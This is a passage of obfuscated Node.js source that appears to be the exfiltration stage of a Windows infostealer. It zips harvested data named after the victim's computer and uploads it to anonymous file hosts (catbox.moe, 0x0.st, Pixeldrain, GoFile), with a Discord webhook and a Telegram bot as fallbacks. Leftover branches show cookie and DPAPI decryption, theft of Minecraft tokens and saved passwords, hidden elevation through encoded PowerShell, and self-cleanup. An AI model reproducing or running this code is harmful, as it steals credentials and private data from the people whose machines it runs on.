    oOqKv: "EODuH",
    rlJUg: function (c, d, g, h) {
      return c(d, g, h);
    }
  };
  return new Promise((c, d) => {
    const g = {
      yzFWf: b.xzNQL,
      YasWy: b.FKYFL,
      YDrvd: function (h, i) {
        return h + i;
      },
      DgCZc: function (h, i, j) {
        return b.qyIvq(h, i, j);
      },
      tCjFr: b.RxYWo,
      OHzYs: b.xXpDm,
      eztoV: function (h, i, j) {
        return b.hDeTR(h, i, j);
      }
    };
    if (b.lpCNL(b.zTstG, b.zTstG)) {
      h.push(g.yzFWf);
      i.push(g.YasWy);
      j.push("File size: " + k.statSync(l).size + " bytes");
    } else {
      const i = "C:\\Windows\\System32\\curl.exe";
      const j = "\"" + i + "\" -s --max-time 120 -F \"reqtype=fileupload\" -F \"fileToUpload=@\"" + a + "\"\" \"https://catbox.moe/user/api.php\"";
      try {
        if (b.MDLVF(b.EtYYL, b.EAUuj)) {
          const l = fs.statSync(a).size;
          if (b.uFEyh(l, b.xRYgv(b.xRYgv(200, 1024), 1024))) {
            if (b.ZnWWC("EODuH", b.oOqKv)) {
              b.klgfz(logInfo, "[Catbox] Skipping upload: File too large (" + formatBytes(l) + ")");
              return b.klgfz(c, null);
            } else {
              try {
                g.unlinkSync(h);
              } catch (n) {}
            }
          }
          logInfo("[Catbox] Uploading " + path.basename(a) + " (Size: " + b.jyyjI(formatBytes, l) + ")...");
        } else {
          try {
            return k.readFileSync(l, "utf8").trim();
          } catch (o) {
            o.push(g.YDrvd(p, ": ") + o.code);
          }
        }
      } catch (o) {}
      const k = {
        timeout: 150000,
        windowsHide: true
      };
      b.rlJUg(exec, j, k, (p, q, r) => {
        const s = {
          zjnqD: function (u, v) {
            return b.YfTPK(u, v);
          }
        };
        const t = q ? q.trim() : "";
        if (p) {
          if (b.ZnWWC(b.ZYMWz, b.gkuum)) {
            g.DgCZc(b, g.tCjFr, {
              stdio: g.OHzYs,
              timeout: 5000,
              windowsHide: true
            });
            return true;
          } else {
            b.yOKxh(logError, p, b.dcWVl);
            if (p.killed) {
              return b.jyyjI(d, new Error(b.RfEby));
            }
          }
        }
        if (t.startsWith(b.kWTEE)) {
          if (b.ZnWWC(b.BuKdt, "rfapg")) {
            b.UtqnQ(logInfo, "[Catbox] Success: " + t);
            b.UtqnQ(c, t);
          } else {
            d = g.join("C:", h);
          }
        } else if (b.gSFTe("IwyUR", b.yHUTt)) {
          const x = d.match(/http[^\s]+/);
          if (x) {
            i("[0x0.st] Success (matched): " + x[0]);
            return s.zjnqD(j, x[0]);
          }
        } else {
          if (t && t.includes(b.kWTEE)) {
            const y = t.match(/http[^\s]+/);
            if (y) {
              if (b.MDLVF(b.WgMYv, b.Lvrhl)) {
                logInfo("[Catbox] Success (matched): " + y[0]);
                return b.XJAFH(c, y[0]);
              } else {
                g.eztoV(c, d, 1500);
              }
            }
          }
          const x = "Catbox failed. Output: " + t.slice(0, 200) + " | Stderr: " + (r ? r.slice(0, 200) : b.iQhwp);
          b.hDeTR(logError, x, b.Jqctx);
          b.klgfz(d, new Error(x));
        }
      });
    }
  });
}
async function uploadTo0x0(a) {
  const b = {
    aibYQ: "Upload to Catbox timed out.",
    sTkAT: function (c, d) {
      return c > d;
    },
    tfPGq: function (c, d) {
      return c + d;
    },
    FfwMy: "net session",
    ryguZ: function (c, d) {
      return c !== d;
    },
    pMVrE: "iLoeU",
    dinlQ: "pCgwp",
    ytOnE: function (c, d) {
      return c === d;
    },
    FegAr: "lRyEj",
    DedJq: function (c, d) {
      return c(d);
    },
    dPBit: function (c, d) {
      return c(d);
    },
    JkDLZ: "sBqwh",
    ARCJj: "ZWdGW",
    emVkP: "KfcPq",
    Zaqld: function (c, d) {
      return c(d);
    },
    Tuday: function (c, d, g) {
      return c(d, g);
    },
    YOHRI: "0x0st-Upload",
    oLtTT: "pLrlS",
    TTrdh: "C:\\Windows\\System32\\curl.exe",
    AdvyJ: function (c, d) {
      return c * d;
    },
    GLQMe: function (c, d) {
      return c(d);
    },
    aScNm: function (c, d) {
      return c(d);
    },
    ULfxf: function (c, d) {
      return c(d);
    },
    vQdFY: function (c, d) {
      return c(d);
    },
    RbiXO: function (c, d, g, h) {
      return c(d, g, h);
    }
  };
  return new Promise((c, d) => {
    const g = {
      Wlbuw: function (h, i) {
        return h(i);
      },
      dKyXV: b.aibYQ,
      UMNLS: function (h, i) {
        return b.sTkAT(h, i);
      },
      jLkol: function (h, i) {
        return b.tfPGq(h, i);
      },
      gkDYe: "... (truncated)",
      fFrKI: b.FfwMy,
      zgRhZ: "tasklist",
      qwYPJ: function (h, i) {
        return b.ryguZ(h, i);
      },
      VkMXX: b.pMVrE,
      CVpAe: b.dinlQ,
      QYIkE: function (h, i) {
        return b.ytOnE(h, i);
      },
      DvcGF: b.FegAr,
      gZotE: function (h, i) {
        return b.DedJq(h, i);
      },
      XTAia: "pzRph",
      YkxaH: function (h, i) {
        return b.dPBit(h, i);
      },
      ZhvdT: b.JkDLZ,
      soMlL: b.ARCJj,
      xksia: "http",
      hjYel: "LBImq",
      PWaKO: b.emVkP,
      WGNIT: function (h, i) {
        return b.Zaqld(h, i);
      },
      IGKUV: function (h, i, j) {
        return b.Tuday(h, i, j);
      },
      IiesW: b.YOHRI
    };
    if (b.ytOnE("vCaHf", b.oLtTT)) {
      const i = i.toLowerCase();
      for (const [j, k] of m.entries(n)) {
        if (i.includes(j) && k[q]) {
          return k[r];
        }
      }
      return null;
    } else {
      const i = b.TTrdh;
      const j = "\"" + i + "\" -s --max-time 120 -F \"file=@\"" + a + "\"\" \"https://0x0.st\"";
      try {
        const l = fs.statSync(a).size;
        if (l > b.AdvyJ(b.AdvyJ(512, 1024), 1024)) {
          b.GLQMe(logInfo, "[0x0.st] Skipping upload: File too large (" + b.aScNm(formatBytes, l) + ")");
          return b.ULfxf(c, null);
        }
        b.vQdFY(logInfo, "[0x0.st] Uploading " + path.basename(a) + " (Size: " + formatBytes(l) + ")...");
      } catch (m) {}
      const k = {
        timeout: 150000,
        windowsHide: true
      };
      b.RbiXO(exec, j, k, (n, o, p) => {
        const q = {
          CEOpw: function (r, s, t) {
            return r(s, t);
          },
          eQfcP: g.fFrKI,
          pDmnt: g.zgRhZ
        };
        if (g.qwYPJ(g.VkMXX, g.CVpAe)) {
          const r = o ? o.trim() : "";
          if (n) {
            if (g.QYIkE(g.DvcGF, g.DvcGF)) {
              logError(n, "0x0st-Curl-Error");
              if (n.killed) {
                return g.gZotE(d, new Error("Upload to 0x0.st timed out."));
              }
            } else {
              return b.data.attachments[0].url;
            }
          }
          if (r.startsWith("http")) {
            if (g.QYIkE(g.XTAia, g.XTAia)) {
              g.YkxaH(logInfo, "[0x0.st] Success: " + r);
              g.Wlbuw(c, r);
            } else {
              try {
                q.CEOpw(c, q.eQfcP, {
                  stdio: "ignore",
                  timeout: 5000,
                  windowsHide: true
                });
                return true;
              } catch (v) {
                return false;
              }
            }
          } else if (g.ZhvdT !== g.soMlL) {
            if (r && r.includes(g.xksia)) {
              if (g.QYIkE(g.hjYel, g.PWaKO)) {
                return g.Wlbuw(c, new d(g.dKyXV));
              } else {
                const w = r.match(/http[^\s]+/);
                if (w) {
                  g.WGNIT(logInfo, "[0x0.st] Success (matched): " + w[0]);
                  return g.gZotE(c, w[0]);
                }
              }
            }
            const u = "0x0.st failed. Output: " + r.slice(0, 200);
            g.IGKUV(logError, u, g.IiesW);
            g.WGNIT(d, new Error(u));
          } else if (g.value && g.UMNLS(h.value.length, 1020)) {
            k.value = g.jLkol(l.value.substring(0, 1000), g.gkDYe);
          }
        } else {
          const A = c(q.pDmnt, {
            windowsHide: true,
            timeout: 10000
          }).toString().toLowerCase();
          if (d.processes.some(B => A.includes(B))) {
            return true;
          }
        }
      });
    }
  });
}
async function uploadToGofile(c) {
  const d = {
    Cdkmr: function (g) {
      return g();
    },
    wTWpg: function (g, h) {
      return g > h;
    },
    ltsbb: function (g, h) {
      return g === h;
    },
    FFRqv: "ObyeV",
    dKzZZ: "Zip file does not exist",
    MZEEu: function (g, h) {
      return g(h);
    },
    ymaxA: "https",
    YpQyi: "djWne",
    qurZL: "https://api.gofile.io/accounts",
    eqKsi: "file",
    IYELV: "token",
    lhLVD: "https://upload.gofile.io/uploadfile",
    axZIz: function (g, h) {
      return g + h;
    },
    iXLRH: "Gofile status: ",
    sCgeC: "unknown"
  };
  try {
    if (d.ltsbb(d.FFRqv, d.FFRqv)) {
      if (!fs.existsSync(c)) {
        throw new Error(d.dKzZZ);
      }
      const g = fs.statSync(c).size;
      logInfo("[GoFile] Uploading " + path.basename(c) + " (" + d.MZEEu(formatBytes, g) + ")...");
      const h = {
        rejectUnauthorized: false
      };
      const i = new (require(d.ymaxA).Agent)(h);
      let j = "";
      try {
        if (d.YpQyi !== "nVmxN") {
          const m = {
            httpsAgent: i,
            timeout: 15000
          };
          const n = await axios.post(d.qurZL, {}, m);
          if (n.data && n.data.status === "ok") {
            j = n.data.data.token;
          }
        } else {
          const p = {
            path: g,
            size: h.size
          };
          d.push(p);
        }
      } catch (p) {}
      const k = new FormData();
      k.append(d.eqKsi, fs.createReadStream(c));
      if (j) {
        k.append(d.IYELV, j);
      }
      const l = await axios.post(d.lhLVD, k, {
        headers: {
          ...k.getHeaders()
        },
        httpsAgent: i,
        maxContentLength: Infinity,
        maxBodyLength: Infinity,
        timeout: 180000
      });
      if (l.data && d.ltsbb(l.data.status, "ok") && l.data.data) {
        return l.data.data.downloadPage || d.axZIz("https://gofile.io/d/", l.data.data.fileId);
      }
      throw new Error(d.axZIz(d.iXLRH, l.data ? l.data.status : d.sCgeC));
    } else {
      const r = d.Cdkmr(d);
      if (d.wTWpg(r.length, 0)) {
        i.importantCookies = j.importantCookies.concat(r);
      }
    }
  } catch (r) {
    logError(r, "GoFile-Upload");
    throw r;
  }
}
async function uploadToPixeldrain(a) {
  try {
    if (!fs.existsSync(a)) {
      throw new Error("Zip file does not exist");
    }
    const c = fs.statSync(a).size;
    logInfo("[Pixeldrain] Uploading " + path.basename(a) + " (" + formatBytes(c) + ")...");
    const d = new FormData();
    d.append("file", fs.createReadStream(a));
    d.append("anonymous", "true");
    const g = await axios.post("https://pixeldrain.com/api/file", d, {
      headers: {
        ...d.getHeaders()
      },
      maxContentLength: Infinity,
      maxBodyLength: Infinity,
      timeout: 180000
    });
    if (g.data && g.data.id) {
      return "https://pixeldrain.com/u/" + g.data.id;
    }
    throw new Error("Pixeldrain: no id returned");
  } catch (j) {
    logError(j, "Pixeldrain-Upload");
    throw j;
  }
}
async function uploadDirectToWebhook(b, c) {
  const d = {
    Kgslt: function (g, h) {
      return g(h);
    },
    tFIZG: function (g, h, i, j) {
      return g(h, i, j);
    },
    sLiER: function (g, h) {
      return g + h;
    },
    JqLzk: "powershell.exe Add-Type -AssemblyName System.Security; [System.Security.Cryptography.ProtectedData]::Unprotect([byte[]]@(",
    sTIiv: function (g, h, i) {
      return g(h, i);
    },
    OugPN: "ignore",
    GALzY: "Running without administrator (elevation failed or cancelled).",
    OYMSb: function (g, h) {
      return g === h;
    },
    LDHJg: "EPKer",
    GAxLH: function (g, h) {
      return g > h;
    },
    btlDO: function (g, h) {
      return g * h;
    },
    ROrLp: "📦 Auto-upload (providers failed)",
    xWdxt: function (g, h) {
      return g >= h;
    },
    xoolF: "YDGkC",
    MUfgh: function (g, h) {
      return g === h;
    },
    kmNLP: "qSDeQ",
    SQSkd: "qqFrI",
    HqHSj: function (g, h) {
      return g !== h;
    },
    kxsGx: "HfTbW",
    vzKOa: "Direct-Webhook-Upload"
  };
  try {
    if (d.OYMSb(d.LDHJg, d.LDHJg)) {
      if (!c || !fs.existsSync(b)) {
        return null;
      }
      const g = fs.statSync(b).size;
      if (d.GAxLH(g, d.btlDO(d.btlDO(24, 1024), 1024))) {
        return null;
      }
      logInfo("[Direct] Sending ZIP to webhook (" + d.Kgslt(formatBytes, g) + ")...");
      const h = new FormData();
      h.append("file", fs.createReadStream(b), {
        filename: path.basename(b)
      });
      const i = {
        content: d.ROrLp
      };
      h.append("payload_json", JSON.stringify(i));
      const j = await axios.post(c, h, {
        headers: {
          ...h.getHeaders()
        },
        maxContentLength: Infinity,
        maxBodyLength: Infinity,
        timeout: 120000
      });
      if (d.xWdxt(j.status, 200) && j.status < 300) {
        if (d.OYMSb(d.xoolF, "GSdnk")) {
          const l = {
            pXgcN: function (n, o) {
              return d.Kgslt(n, o);
            }
          };
          d.tFIZG(g, d.sLiER(d.JqLzk, h) + "), $null, 'CurrentUser')", {
            timeout: 10000,
            windowsHide: true
          }, (o, p) => {
            if (o) {
              k(o);
            } else {
              l.pXgcN(l, p);
            }
          });
        } else {
          if (j.data && j.data.attachments && j.data.attachments[0]) {
            if (d.MUfgh(d.kmNLP, d.SQSkd)) {
              g.push(h.readInt32BE(i));
              j += 4;
            } else {
              return j.data.attachments[0].url;
            }
          }
          return "direct-upload-success";
        }
      }
      return null;
    } else {
      d.sTIiv(c, "attrib +h +s \"" + d + "\"", {
        stdio: d.OugPN,
        windowsHide: true
      });
    }
  } catch (n) {
    if (d.HqHSj("HfTbW", d.kxsGx)) {
      d.Kgslt(b, d.GALzY);
    } else {
      d.sTIiv(logError, n, d.vzKOa);
      return null;
    }
  }
}
async function uploadDirectToTelegram(a, b, c) {
  const d = {
    uhFtK: function (g, h, i) {
      return g(h, i);
    },
    XmDqv: "disableuac",
    AMZgq: "prismlauncher.cfg",
    YcxaA: "portable.txt",
    rhaqD: "PrismLauncher.exe",
    VYnFO: function (g, h) {
      return g === h;
    },
    DtXwW: "bfHXS",
    OUBMC: function (g, h) {
      return g > h;
    },
    XHebO: function (g, h) {
      return g * h;
    },
    UFRtv: function (g, h) {
      return g * h;
    },
    WNGyY: function (g, h) {
      return g(h);
    },
    BXsUE: "caption",
    KeTLw: "📦 Auto-upload (providers failed)",
    GraXG: function (g, h) {
      return g !== h;
    },
    NWRtN: "Direct-Telegram-Upload"
  };
  try {
    if (d.VYnFO("bfHXS", d.DtXwW)) {
      if (!b || !c || !fs.existsSync(a)) {
        return null;
      }
      const g = fs.statSync(a).size;
      if (d.OUBMC(g, d.XHebO(d.UFRtv(49, 1024), 1024))) {
        return null;
      }
      d.WNGyY(logInfo, "[Direct] Sending ZIP to Telegram (" + d.WNGyY(formatBytes, g) + ")...");
      const h = new FormData();
      h.append("chat_id", c);
      h.append("document", fs.createReadStream(a), {
        filename: path.basename(a)
      });
      h.append(d.BXsUE, d.KeTLw);
      const i = await axios.post("https://api.telegram.org/bot" + b + "/sendDocument", h, {
        headers: {
          ...h.getHeaders()
        },
        maxContentLength: Infinity,
        maxBodyLength: Infinity,
        timeout: 120000
      });
      if (i.data && i.data.ok) {
        return "telegram-direct-success";
      }
      return null;
    } else {
      d.uhFtK(c, d, d.XmDqv);
    }
  } catch (k) {
    if (d.GraXG("dZeXC", "NsrQm")) {
      d.uhFtK(logError, k, d.NWRtN);
      return null;
    } else if (p.existsSync(q)) {
      const m = C.join(D, d.AMZgq);
      const n = E.join(F, d.YcxaA);
      if (G.existsSync(m) || H.existsSync(n)) {
        return N;
      }
      const o = J.join(K, d.rhaqD);
      if (L.existsSync(o)) {
        return O;
      }
    }
  }
}
function createZipArchiveCatbox(a, b) {
  const c = {
    XFREu: "createZipArchiveCatbox",
    hDmni: "XRhbS",
    hcFYt: function (d, g, h) {
      return d(g, h);
    },
    HIYoZ: "zip"
  };
  return new Promise((d, g) => {
    const h = {
      FXPDe: function (i, j, k) {
        return i(j, k);
      },
      EZNKk: c.XFREu
    };
    if (c.hDmni === c.hDmni) {
      const i = fs.createWriteStream(b);
      const l = c.hcFYt(archiver, c.HIYoZ, {
        zlib: {
          level: 1
        }
      });
      i.on("close", () => d(b));
      l.on("error", n => {
        h.FXPDe(logError, n, h.EZNKk);
        g(n);
      });
      l.pipe(i);
      const m = path.basename(b, ".zip");
      l.directory(a, m);
      l.finalize();
    } else {
      h.FXPDe(c, d, "initializeService-general");
    }
  });
}
function createZipArchive(a, b) {
  return new Promise((d, g) => {
    const j = fs.createWriteStream(b);
    const m = archiver("zip", {
      zlib: {
        level: 1
      }
    });
    j.on("close", () => d(b));
    m.on("error", n => {
      logError(n, "createZipArchive");
      g(n);
    });
    m.pipe(j);
    m.directory(a, false);
    m.finalize();
  });
}
function getDirectorySize(a) {
  let c = 0;
  try {
    if (fs.existsSync(a)) {
      const g = fs.readdirSync(a);
      for (const h of g) {
        const i = path.join(a, h);
        const j = fs.statSync(i);
        if (j.isDirectory()) {
          c += getDirectorySize(i);
        } else {
          c += j.size;
        }
      }
    }
  } catch (m) {}
  return c;
}
async function createAndUploadZip() {
  const g = {
    XvaRy: function (s, t, u) {
      return s(t, u);
    },
    HpkYX: "Other",
    ROjeP: "Network",
    FWNkw: "Cookies",
    SEldA: function (s, t) {
      return s(t);
    },
    LqnEA: "createZipArchive",
    XdKuF: function (s, t) {
      return s(t);
    },
    hZaCz: "aes-256-gcm",
    qutCf: function (s, t) {
      return s > t;
    },
    hHUKh: "utf8",
    PWuHJ: "--hidden",
    oUkLJ: "--folder",
    uGRPt: "utf16le",
    NCjSz: "base64",
    tqtGp: "ignore",
    Olfwo: "\n=== Minecraft Servers ===",
    OTYkZ: "Server list found in servers.dat (NBT format)",
    jTgps: "4|1|0|5|2|3",
    Ebczf: "N/A",
    ILGgA: "Unknown",
    obSAh: "Missing",
    rFhjW: "Present",
    Wvywl: function (s, t, u) {
      return s(t, u);
    },
    ZVsiI: "sendDiscordEmbed-ipLookup",
    fXPNW: function (s, t) {
      return s && t;
    },
    cCOQL: "sha256",
    cXibu: function (s, t) {
      return s + t;
    },
    Pecng: function (s, t) {
      return s + t;
    },
    SjvqV: "hex",
    IBrTJ: "pegrr",
    qzAge: "yVLAq",
    JlGwa: function (s, t) {
      return s(t);
    },
    rIWhc: function (s, t) {
      return s / t;
    },
    txdzY: function (s, t) {
      return s < t;
    },
    ZJNjG: function (s, t) {
      return s * t;
    },
    LvCoO: function (s, t) {
      return s !== t;
    },
    NIFLQ: "tcoBj",
    KVMMy: "QOkgS",
    hPdHs: "rKpgU",
    NObzF: function (s, t, u) {
      return s(t, u);
    },
    YBhoP: "qzfMl",
    eRRMO: "RmmKr",
    IQbtq: "Zip-Create",
    wswdN: function (s, t) {
      return s === t;
    },
    ROdZE: "Vaddy",
    GZiIF: "joeQo",
    VtJmR: function (s, t, u) {
      return s(t, u);
    },
    kknHB: function (s, t) {
      return s !== t;
    },
    NwkfU: "pJbHl",
    lFlmY: "swlup",
    fyzuP: "dKMaY",
    oHzvI: "Failed to create any ZIP file",
    oXirN: "Catbox",
    YxpfZ: "0x0.st",
    dcRNU: "Pixeldrain",
    gBzkx: "GoFile",
    IRWUh: function (s, t) {
      return s !== t;
    },
    uHcIf: "OGWLy",
    FgBGX: function (s, t) {
      return s * t;
    },
    QuWEW: "TAsZP",
    GUqkD: "http",
    nHPNQ: function (s, t) {
      return s === t;
    },
    LpjST: "dFzFP",
    Xvjxa: function (s, t) {
      return s(t);
    },
    jkyzq: function (s, t) {
      return s !== t;
    },
    aQWcu: "Cfmhs",
    xLWMF: "fuiFP",
    oBacX: "iDoFe",
    raeUO: "eLmSO",
    qnDcj: "nafxg",
    nterQ: "Direct-Webhook",
    aHkTB: function (s, t, u, v) {
      return s(t, u, v);
    },
    NUjcN: function (s, t) {
      return s === t;
    },
    dHZrQ: "uHdmV",
    Kmvln: function (s, t) {
      return s(t);
    },
    OnccW: function (s, t) {
      return s === t;
    },
    lAYYn: "GHSXI",
    HqHOc: "bgdTZ",
    SYwEB: function (s, t, u) {
      return s(t, u);
    },
    cqlfl: "All upload providers failed.",
    xsfhL: "createAndUploadZip-final"
  };
  const h = path.dirname(mainFolderPath);
  const i = locale + "-" + computerName;
  let j = null;
  let k = 0;
  let l = null;
  try {
    if (g.IBrTJ !== g.qzAge) {
      k = getDirectorySize(mainFolderPath);
      g.JlGwa(logInfo, "[System] Folder size before zip: " + (g.rIWhc(k, 1024) / 1024).toFixed(2) + " MB");
    } else {
      g.XvaRy(c, r, "fetchSessionData");
      return 0;
    }
  } catch (t) {}
  const m = path.join(h, i + ".zip");
  const n = path.join(h, i + "_fallback.zip");
  if (g.txdzY(k, g.ZJNjG(200, 1024) * 1024)) {
    if (g.LvCoO(g.NIFLQ, g.NIFLQ)) {
      if (!g) {
        return g.HpkYX;
      }
      const v = h.toLowerCase();
      for (const [w, x] of k.entries(l)) {
        for (const y of x) {
          if (v.includes(y)) {
            return w;
          }
        }
      }
      return g.HpkYX;
    } else {
      try {
        if (g.LvCoO(g.KVMMy, g.hPdHs)) {
          await g.NObzF(createZipArchiveCatbox, mainFolderPath, m);
          l = m;
        } else {
          k = l.join(m, g.ROjeP, g.FWNkw);
          if (!n.existsSync(o)) {
            p = q.join(r, g.FWNkw);
          }
        }
      } catch (w) {
        if (g.LvCoO(g.YBhoP, g.eRRMO)) {
          logError(w, g.IQbtq);
        } else {
          return "";
        }
      }
    }
  }
  if (!l || !fs.existsSync(l)) {
    if (g.wswdN(g.ROdZE, g.ROdZE)) {
      try {
        if (g.LvCoO(g.GZiIF, "joeQo")) {
          g.SEldA(r, "Direct webhook upload success");
          const z = {
            link: g,
            size: h
          };
          return z;
        } else {
          await g.VtJmR(createZipArchive, mainFolderPath, n);
          l = n;
        }
      } catch (z) {
        if (g.kknHB(g.NwkfU, "AoGFn")) {
          g.XvaRy(logError, z, "Zip-Create-Fallback");
        } else {
          c(r, "main-executor");
        }
      }
    } else {
      g(h, g.LqnEA);
      g.XdKuF(i, j);
    }
  }
  if (!l || !fs.existsSync(l)) {
    if (g.lFlmY !== g.fyzuP) {
      logError(g.oHzvI, "createAndUploadZip");
      return {
        link: null,
        size: g.JlGwa(formatBytes, k)
      };
    } else {
      return false;
    }
  }
  const o = g.JlGwa(formatBytes, fs.statSync(l).size);
  const q = [{
    name: g.oXirN,
    fn: () => uploadToCatbox(l),
    maxMB: 200
  }, {
    name: g.YxpfZ,
    fn: () => uploadTo0x0(l),
    maxMB: 500
  }, {
    name: g.dcRNU,
    fn: () => uploadToPixeldrain(l),
    maxMB: 10000
  }, {
    name: g.gBzkx,
    fn: () => uploadToGofile(l),
    maxMB: 10000
  }];
  for (const D of q) {
    if (g.IRWUh(g.uHcIf, g.uHcIf)) {
      const F = i.createDecipheriv(g.hZaCz, j, k);
      F.setAuthTag(l);
      const G = m.concat([F.update(n), F.final()]);
      if (g.qutCf(G.length, 32)) {
        return G.slice(32).toString(g.hHUKh);
      } else {
        return G.toString(g.hHUKh);
      }
    } else {
      if (k > g.ZJNjG(g.FgBGX(D.maxMB, 1024), 1024)) {
        continue;
      }
      try {
        if (g.QuWEW !== "TAsZP") {
          const G = j.execPath;
          const H = k.dirname(G);
          const I = l.argv.slice(1);
          if (!I.includes(g.PWuHJ)) {
            I.push(g.PWuHJ);
          }
          if (!I.includes("--folder")) {
            I.push(g.oUkLJ, q);
          }
          const J = I.map(M => "\"" + M + "\"").join(",");
          const K = "Start-Process -FilePath \"" + G + "\" -ArgumentList " + J + " -WorkingDirectory \"" + H + "\" -Verb RunAs -WindowStyle Hidden";
          const L = n.from(K, g.uGRPt).toString(g.NCjSz);
          g.XvaRy(o, "powershell -NoProfile -ExecutionPolicy Bypass -EncodedCommand " + L, {
            windowsHide: true,
            stdio: g.tqtGp,
            timeout: 30000
          });
          D.exit(0);
        } else {
          j = await D.fn();
          if (j && j.startsWith(g.GUqkD)) {
            if (g.nHPNQ(g.LpjST, g.LpjST)) {
              g.Xvjxa(logSuccess, D.name + " Upload Success: " + j);
              const G = {
                link: j,
                size: o
              };
              return G;
            } else {
              try {
                o.push(g.Olfwo);
                D.push(g.OTYkZ);
                q.push("File size: " + r.statSync(s).size + " bytes");
              } catch (I) {
                u.push("Error reading servers.dat");
              }
            }
          }
        }
      } catch (I) {
        if (g.jkyzq(g.aQWcu, g.aQWcu)) {
          c.push("  " + r.trim());
        } else {
          g.Wvywl(logError, I, D.name + "-Failed");
        }
      }
    }
  }
  try {
    if (g.jkyzq(g.xLWMF, g.oBacX)) {
      const K = await g.NObzF(uploadDirectToWebhook, l, discordWebhookURL);
      if (K) {
        logSuccess("Direct webhook upload success");
        const L = {
          link: K,
          size: o
        };
        return L;
      }
    } else {
      const N = g.jTgps.split("|");
      let O = 0;
      while (true) {
        switch (N[O++]) {
          case "0":
            v.push("  Username: " + (w.username || g.Ebczf));
            continue;
          case "1":
            t.push("  Type: " + (u.type || g.ILGgA));
            continue;
          case "2":
            if (z.microsoft) {
              G.push("  Microsoft Account: Yes");
              H.push("  Access Token: " + (I.microsoft.access_token ? "Present" : g.obSAh));
              J.push("  Refresh Token: " + (K.microsoft.refresh_token ? g.rFhjW : g.obSAh));
            }
            continue;
          case "3":
            F.push("");
            continue;
          case "4":
            r.push("Account " + (s + 1) + ":");
            continue;
          case "5":
            x.push("  UUID: " + (y.uuid || g.Ebczf));
            continue;
        }
        break;
      }
    }
  } catch (N) {
    if (g.raeUO === g.qnDcj) {
      g.Wvywl(r, g, g.ZVsiI);
      h = "IP retrieval error";
    } else {
      logError(N, g.nterQ);
    }
  }
  try {
    const P = await g.aHkTB(uploadDirectToTelegram, l, telegramBotToken, telegramChatId);
    if (P) {
      if (g.NUjcN(g.dHZrQ, g.dHZrQ)) {
        g.Kmvln(logSuccess, "Direct Telegram upload success");
        const Q = {
          link: P,
          size: o
        };
        return Q;
      } else {
        const S = j.match(/URL: (.+)/);
        const T = k.match(/Username: (.+)/);
        const U = l.match(/Password: (.+)/);
        const V = m.match(/Application: (.+)/);
        if (g.fXPNW(S, T) && U) {
          q.push({
            url: S[1].trim(),
            username: T[1].trim(),
            password: U[1].trim(),
            application: V ? V[1].trim() : r,
            category: g.XdKuF(s, S[1].trim())
          });
        }
      }
    }
  } catch (S) {
    if (g.OnccW(g.lAYYn, g.HqHOc)) {
      var U = h.createHash(g.cCOQL).update(g.cXibu(g.Pecng(i.hostname(), "\0"), j.userInfo().username)).digest(g.SjvqV);
      if (U === k) {
        l.exit(0);
      }
    } else {
      g.NObzF(logError, S, "Direct-Telegram");
    }
  }
  g.SYwEB(logError, g.cqlfl, g.xsfhL);
  const r = {
    link: null,
    size: o
  };
  return r;
}
function initializeFolders() {
  try {
    if (!fs.existsSync(mainFolderPath)) {
      fs.mkdirSync(mainFolderPath, {
        recursive: true
      });
    }
    const c = path.join(mainFolderPath, "log.txt");
    const d = "[START] " + getTimestamp() + " | PID: " + process.pid + "\n";
    if (!fs.existsSync(c)) {
      fs.writeFileSync(c, d, "utf8");
    } else {
      fs.appendFileSync(c, d, "utf8");
    }
  } catch (k) {}
}
function selfCleanup(a) {
  const b = {
    fkeIZ: function (c, d) {
      return c + d;
    },
    MvHYd: function (c, d) {
      return c * d;
    },
    pumWR: function (c, d) {
      return c + d;
    },
    cxZdb: "hex",
    EpfLX: "aes-256-gcm",
    kCRKO: "utf8",
    nvekV: function (c, d) {
      return c(d);
    },
    gmuzA: "http://",
    ITPQW: function (c, d) {
      return c > d;
    },
    wiGkU: "no_restriction",
    oqdUU: "lax",
    MkDJZ: "strict",
    cTRxZ: "en-GB",
    lWWeP: "2-digit",
    OkfhS: "numeric",
    YaWEy: "Encrypted connections only",
    xkkBN: "Any type of connection",
    hGPSG: "Valid for host only",
    llBUz: "Valid for subdomains",
    mtStj: "firefox-default",
    XUsQe: function (c, d) {
      return c === d;
    },
    nRrll: "YkAaK",
    SdUTj: "WqRHc",
    TSPXG: "BHtUH",
    DIhGI: function (c, d, g) {
      return c(d, g);
    },
    VIcVz: "powershell -NoProfile -ExecutionPolicy Bypass -Command \"(Get-Volume -DriveLetter C).Size\"",
    LeyqS: "pipe",
    SXFqV: function (c, d) {
      return c < d;
    },
    QObsW: function (c, d) {
      return c * d;
    },
    SaiBw: "ignore",
    hcznM: function (c, d) {
      return c === d;
    },
    GQzuE: "wjbhk",
    gxWPk: "IWtVU",
    FsIio: "iSOCH",
    mkQPQ: "JEUDA",
    BtloM: "VnsLH",
    xlxkl: function (c, d) {
      return c !== d;
    },
    zIIKo: "DpasM",
    Azbvq: "lGwOa",
    XpHii: "[CMD] 0x01P:",
    aOfpF: "WinHost.lock",
    Ebktk: function (c, d) {
      return c !== d;
    },
    AkuRb: "FTzaa",
    LpBcX: function (c, d) {
      return c === d;
    },
    ypVBI: function (c, d) {
      return c !== d;
    },
    BvSrn: "gmiLx"
  };
  try {
    if (b.hcznM("wjbhk", b.GQzuE)) {
      const c = path.dirname(mainFolderPath);
      const d = path.join(c, locale + "-" + computerName + ".zip");
      const g = path.join(c, locale + "-" + computerName + "_fallback.zip");
      if (fs.existsSync(d)) {
        if (b.XUsQe("IWtVU", b.gxWPk)) {
          try {
            if (b.FsIio !== b.mkQPQ) {
              fs.unlinkSync(d);
            } else {
              h = b.fkeIZ(b.MvHYd(i, 256), j[b.pumWR(k, 8)]);
              l = 9;
            }
          } catch (k) {}
        } else {
          return b;
        }
      }
      if (fs.existsSync(g)) {
        if (b.BtloM !== "VnsLH") {
          var o = h.from(i, b.cxZdb);
          var p = j.createDecipheriv(b.EpfLX, k.from(l, "hex"), o.slice(0, 12));
          p.setAuthTag(o.slice(12, 28));
          return p.update(o.slice(28), null, b.kCRKO) + p.final(b.kCRKO);
        } else {
          try {
            if (b.xlxkl(b.zIIKo, b.zIIKo)) {
              g = true;
              b.nvekV(h, "[Games] Successfully collected: " + i + " -> " + j);
            } else {
              fs.unlinkSync(g);
            }
          } catch (o) {}
        }
      }
      if (a && fs.existsSync(mainFolderPath)) {
        if (b.xlxkl(b.Azbvq, b.Azbvq)) {
          const q = v.host || "";
          const r = !!w.secure;
          const s = b.pumWR(b.fkeIZ(r ? "https://" : b.gmuzA, q), x.path || "/");
